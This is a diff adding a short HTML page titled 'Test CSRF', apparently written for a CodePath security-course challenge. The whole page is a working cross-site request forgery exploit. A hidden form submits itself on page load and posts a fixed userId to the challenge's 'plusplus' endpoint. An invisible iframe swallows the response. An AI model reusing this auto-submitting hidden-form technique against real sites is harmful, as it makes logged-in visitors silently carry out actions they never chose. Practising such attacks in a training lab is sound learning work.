@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Test CSRF</title>
+  </head>
+  <body onload="document.csrf_form.submit()">
+    <form name="csrf_form" style="display: none;" method="POST" action="https://security.codepath.com/user/csrfchallengetwo/plusplus" target="hidden_results">
+      <input type="text" name="userId" value="0db1c879c7d7d4cb7d07d7ad3384ac77bdb61b0e" />
+    </form>
+    <iframe name="hidden_results" style="display: none;"></iframe>
+  </body>
+</html>
